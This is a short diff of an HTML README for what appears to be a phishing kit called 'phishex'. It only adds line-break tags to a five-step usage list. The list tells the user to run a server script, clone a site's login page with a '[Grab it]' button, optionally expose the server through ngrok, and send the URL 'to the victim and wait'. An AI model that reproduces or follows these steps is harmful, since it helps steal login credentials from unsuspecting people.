@@ -33,9 +33,9 @@ password: phishex_666<br>
 <br>
 <b>START</b><br>
 <p>
-1) Run server.py script
-2) Run application
-3) Enter site login page url and click [Grab it]
-4) (OPTIONAL) run .ngrok on port 80
-5) Send url to the victim and wait
+1) Run server.py script<br>
+2) Run application<br>
+3) Enter site login page url and click [Grab it]<br>
+4) (OPTIONAL) run .ngrok on port 80<br>
+5) Send url to the victim and wait<br>
 </p>
